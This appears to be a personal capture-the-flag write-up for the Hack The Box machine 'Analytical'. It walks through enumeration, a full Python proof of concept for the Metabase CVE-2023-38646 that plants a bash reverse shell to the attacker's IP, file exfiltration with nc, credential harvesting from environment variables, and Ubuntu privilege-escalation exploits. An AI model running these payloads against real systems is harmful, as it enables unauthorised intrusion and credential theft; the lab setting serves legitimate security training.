# NMAP

```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-31 15:07 CET
Nmap scan report for analytical.htb (10.10.11.233)
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http
|_http-title: Analytical
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=12/31%OT=22%CT=1%CU=34091%PV=Y%DS=2%DC=I%G=Y%TM=659175
OS:B2%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SE
OS:Q(SP=107%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)OPS(O1=M53AST11NW7%O2=M53AST11NW7%
OS:O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1=FE88%W2
OS:=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNS
OS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%
OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%
OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%
OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.89 seconds
```


# USER

subdomain enumeration

```bash
 gobuster dns --domain analytical.htb -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
```

i found a subdomain:

```
data.analytical.htb
```

Actually this was pretty useless becasue that `data.analytical.htb` was already present on main paga of `analytical.htb` when you try to
go to the `login` page.

and then an nmap scan...

```bash
sudo nmap data.analytical.htb -O -sC 
[sudo] password for angelo: 
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-02 19:43 CET
Nmap scan report for data.analytical.htb (10.10.11.233)
Host is up (0.17s latency).
rDNS record for 10.10.11.233: analytical.htb
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http
|_http-title: Metabase
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=1/2%OT=22%CT=1%CU=36041%PV=Y%DS=2%DC=I%G=Y%TM=65945986
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ(
OS:SP=102%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53AST11NW7%O2=M53AST11N
OS:W7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1=FE88
OS:%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53A
OS:NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=O%F=AS%RD=0%Q=)T1(R=Y%DF=Y%T=40%S=
OS:O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD
OS:=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=F
OS:E88%S=O%A=O%F=AS%O=M53AST11NW7%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%
OS:O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T7(R=Y%DF=Y%T=4
OS:0%W=FE88%S=O%A=O%F=AS%O=M53AST11NW7%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=
OS:0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.78 seconds

```

all http respnses on page enumeration are 200, so gobuster will not work.


ffuf on response body size.

let's ignore (so filter) those one with `28` lines of text/html returned (the bad response if not exists, courtesy page/redirect)

```bash
ffuf -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://data.analytical.htb/FUZZ -fl 28
```

nothing.

nuclei returned instead

```bash
[CVE-2023-38646] [http] [critical] http://data.analytical.htb/api/setup/validate
```

info took from: https://www.vicarius.io/vsociety/posts/unmasking-cve-2023-38646-analyzing-the-critical-metabase-security-vulnerability-and-its-implications-1

So to exploit the CVE, we need to obtain the token to beeing able to obtain a RCE.

Reading about the vulnerability I was able to retrivie the setup-token by simplying:

```python
import requests as r 
url = "http://data.analytical.htb/api/session/properties"
response = r.get(url,verify=False)
jsoned = response.json()
print(jsoned["setup-token"])

>>> 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
```

Then I searched for the right POC online but none seemed to work

I came here in some troubles.

First of all i was getting

```
Vector arg to map conj must be a pair
```

as response from the page for no reason. I just inserted my htb ip to obtain a shell.

The problem is the base64 encode padding.

Since the bash remote command does the following:

```
bash -c {{echo,{encoded_command}}}|{{base64,-d}}|{{bash,-i}}
```

if `encoded_command` contains padding it will lead in `Vector arg to map conj must be a pair` error.
Maybe beacuse `=` are threted as special char remotely, we don;t know. Ayway I fixed adding 2 extra spaces to my 
reverse shell payload for removing base64 extra padding (`==`)

The rever shell becomes:


`bash -i >&/dev/tcp/10.10.16.75/1234 0>&1  `

And the full poc:


```python
import requests as r
import time
import base64

encoded_command = base64.b64encode("bash -i >&/dev/tcp/10.10.16.75/1234 0>&1  ".encode()).decode()

url = "http://data.analytical.htb/api/session/properties"
response = r.get(url, verify=False)
jsoned = response.json()
print("Obtained token" + jsoned["setup-token"])

before = time.time()

url = "http://data.analytical.htb/api/setup/validate"
headers = {'Content-Type': 'application/json'}
payload = f"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{encoded_command}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x"
print(payload)
data = {
    "token": jsoned["setup-token"],
    "details": {
        "is_on_demand": False,
        "is_full_sync": False,
        "is_sample": False,
        "cache_ttl": None,
        "refingerprint": False,
        "auto_run_queries": True,
        "schedules": {},
        "details": {
            "db": payload,
            "advanced-options": False,
            "ssl": True
        },
        "name": "test",
        "engine": "h2"
    }
}
response = r.post(url, json=data, headers=headers, verify=False)
response = response.text
print(f"Elaped {str(time.time()-before)}")
print(response)
```
 
We get an error in output, and if you try to inject sleep has payload they' won't work.


```
{"message":"Error creating or initializing trigger \"PWNSHELL\" object, class \"..source..\", cause: \"org.h2.message.DbException: Syntax error in SQL statement \"\"//javascript\\\\000ajava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE2Ljc1LzEyMzQgMD4mMSAg}|{base64,-d}|{bash,-i}')\\\\000a\"\" [42000-212]\"; see root cause for details; SQL statement:\nSET TRACE_LEVEL_SYSTEM_OUT 1 [90043-212]"}
```

but even in these condition we got our reverse shell in our terminal

Trying to spaw interactive shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl+z
stty raw -echo
fg
```

failed miserably.

There are some interesting files.

In particular huges files in directory metabase.db 

`metabase.db.mv.db ` and `metabase.db.trace.db`.


```bash
tar czf /tmp/compressed.tar.gz metabase.db
receive file: nc -l -p 12344 > metabase.tar.gz
send file: nc 10.10.16.75 12344 < compressed.tar.gz
```

I tryied to read them but seems to be not valid normal db files readble with mysql, postgres or sqlite3.

I tried to search some info by running strings on binaries files.

```bash
strings metabase.db.mv.db
```

but i got no useful hints from there.

that dbs seeems useless.

We're inside a docker container and we can notice it doing an `ls -la /` and noticing the presence of `.dockernv` file.

We might be in a docker container evasion box so I used `deepce.sh` for enumeration.


```
[+] Attempting ping sweep of 172.17.0.2/24 (ping) 
172.17.0.2 is Up                                  
172.17.0.1 is Up    
```

curling 172.17.0.2 i understood that is `analytical.htb`

Nothins useful :(

But then I remembered that we're in a docker container so there might be some useful info saved as environment variables.

Atually, run scripts such as `lse.sh` already gives info about enc content, but i did not take attention enough.

The content of `env` is the follwing.

```
env                       
SHELL=/bin/sh    
MB_DB_PASS=            
HOSTNAME=837e7831da92      
LANGUAGE=en_US:en                   
MB_JETTY_HOST=0.0.0.0
JAVA_HOME=/opt/java/openjdk
MB_DB_FILE=//metabase.db/metabase.db
PWD=/tmp
LOGNAME=metabase
MB_EMAIL_SMTP_USERNAME=
HOME=/home/metabase
LANG=en_US.UTF-8
META_USER=metalytics
META_PASS=An4lytics_ds20223#
MB_EMAIL_SMTP_PASSWORD=
USER=metabase
SHLVL=4
MB_DB_USER=
FC_LANG=en-US
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
LC_CTYPE=en_US.UTF-8
MB_LDAP_BIND_DN=
LC_ALL=en_US.UTF-8
MB_LDAP_PASSWORD=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_CONNECTION_URI=
OLDPWD=/
JAVA_VERSION=jdk-11.0.19+7
_=/usr/bin/env
```

Credentials

```
META_USER=metalytics
META_PASS=An4lytics_ds20223#
```

Seems to be interesting but I had no idea where to use them.

And then the most easy illumination... Why don't try to use that credentials as ssh in the machine?

```bash
ssh metalytics@10.10.11.233
An4lytics_ds20223#
```

aaand got user.

# ROOT


Enumertion with `linpeas.sh` `lse.sh` gave nothing useful.

But then i looked with `uname -a` to the ubuntu version and I came up that maybe the machine can be vulnerable (thanks to its version)
to the famous vulnerability also knwon as `Looney Tunables CVE-2023-4911`.

```
Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux

```

doing `ldd --version` confirmed the ldd vulberable because (<= 1.5 version)

and running the poc:

```bash
env -i "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A" "Z=`printf '%08192x' 1`" /usr/bin/su --help

Segmentation fault (core dumped)
```

gives segmentation fault so it must be vulnerable! 

https://github.com/ruycr4ft/CVE-2023-4911

Location and version of `libc` to compile the exploit

```bash
ldd /bin/bash
  linux-vdso.so.1 (0x00007ffd229a6000)
  libtinfo.so.6 => /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007fc655e47000)
  libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fc655c00000)
  /lib64/ld-linux-x86-64.so.2 (0x00007fc655fe2000)
```

needed pwntools installed , i used a virtual environment and i installed pwntools.

Then i compled the exploit once got the `libc` from htb machine.

I tried to exploit this vulnerability but it was tooking so long. Probably the machine is vulnerable to this attack too but is not the intented solution.

In fact the solution was in another CVE.

I checked for `suid` and I run `lse.sh` and `linpeas.sh` but I found nothing useful again.

So I checked un `uname -a` what version of are we running (again xD)

`uname -a`

And let's chatgpt do some work and get a summary of what the output indicates:

```text
Linux: This indicates the operating system.

analytics: This is the hostname of the system.

6.2.0-25-generic: This is the kernel version. It provides information about the kernel release. In this case, it is version 6.2.0-25-generic. This version includes details such as the major version, minor version, and patch level.

#25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2024: This part provides additional details about the kernel build. It includes information about the build number, Ubuntu version, SMP (Symmetric Multiprocessing) support, and the build timestamp.

x86_64 x86_64 x86_64: These indicate the hardware architecture. In this case, the system is running on x86_64 architecture (64-bit).

GNU/Linux: This specifies the system type. In this case, it's a GNU/Linux system.

```

so searching on exploitdb for exploits for kernel version `6.2.0` returned nothing.

After some search I found the following CVE `CVE-2023-32629` (`GameOver(lay)` Ubuntu privilage escalation) vulerability with a POC:

https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629

Trying the exploit will give you what you are searching for :)